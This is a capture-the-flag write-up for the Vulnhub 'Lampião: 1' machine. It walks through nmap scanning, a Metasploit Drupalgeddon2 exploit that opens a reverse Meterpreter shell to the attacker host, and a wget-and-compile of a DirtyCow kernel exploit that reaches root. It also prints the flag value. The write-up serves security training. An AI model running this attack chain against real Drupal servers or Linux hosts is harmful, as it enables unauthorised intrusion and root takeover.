# Lampiao Vulnhub Writeup

Link:           [Lampião: 1 by Tiago Tavares](https://www.vulnhub.com/entry/lampiao-1,249/)

* Details:        Boot2Root Virtual Machine
* Author Rating:  Easy
* Flag Count:     1
* Flag Location:  /root/flag.txt
* Flag Contents:  9740616875908d91ddcdaa8aea3af366

## Runsheet

Located the Virtual Machine's IP;

```bash
arp-scan 192.168.146.0/24
```

Nmap Host to identify open ports on the machine and attempt to identify the host operating system;

```bash
nmap -sV -O 192.168.146.132
```

I found 2 open ports on that virtual machine; 22, and 80 using the NMAP scan, 80 led me nowhere other than learning swear words in porchagese. So I used a more verbose full scan of the machine.

```bash
nmap -p 1-65535 -T4 -A -v 192.168.146.132
```

This listed a new port; Port 1898, which, when navigated to on a web browser, shows us a drupal blog. Doing some dirb and checks for common files reveals that this is Version is 7.5.4, which is vulnrable to a CVE affectionatly called drupalgetton. This allows us to execute arbitrary code via remote code execution. Since I had no experence in Metasploit, I thought I would give it a shot.

```text
msf exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/unix/webapp/drupal_drupalgeddon2
msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOST 192.168.146.132
RHOST => 192.168.146.132
msf exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 1898
RPORT => 1898
msf exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 192.168.146.128:4444
[*] Drupal 7 targeted at http://192.168.146.132:1898/
[+] Drupal appears unpatched in CHANGELOG.txt
[*] Sending stage (37775 bytes) to 192.168.146.132
[*] Meterpreter session 2 opened (192.168.146.128:4444 -> 192.168.146.132:44260) at 2018-10-05 11:20:56 -0400
```

With this, we now had a low priv shell on the www-data user account. With this we could try to do some absic enumiration on the machine to gain some infomation on how we could exploit it. Using a common linux  privlage escalation checker, I identikfied that the kernal could be susseptable to the DirtyCow exploit. I verified if the OS was x32 or x64 bit, and downloaded the uncompiled expolit for the OS using Wget and attempted to get the flag before the OS Crashed again (DirtyCow is not a stable exploit).

```text
meterpreter > shell
Process 1420 created.
Channel 1 created.
wget http://192.168.146.128/cowrootx32.c

gcc cowrootx32.c -o cowroot -pthread
--2018-10-05 20:22:56--  http://192.168.146.128/cowrootx32.c
Connecting to 192.168.146.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4688 (4.6K) [text/x-csrc]
Saving to: 'cowrootx32.c.1'

     0K ....                                                  100%  853M=0s

2018-10-05 20:22:56 (853 MB/s) - 'cowrootx32.c.1' saved [4688/4688]

cowrootx32.c: In function 'procselfmemThread':
cowrootx32.c:99:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
         lseek(f,map,SEEK_SET);
         ^
In file included from cowrootx32.c:27:0:
/usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
cowrootx32.c: In function 'main':
cowrootx32.c:142:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
     printf("Size of binary: %d\n", st.st_size);
     ^
./cowroot
whoami
root
cat /root/flag.txt
9740616875908d91ddcdaa8aea3af366
```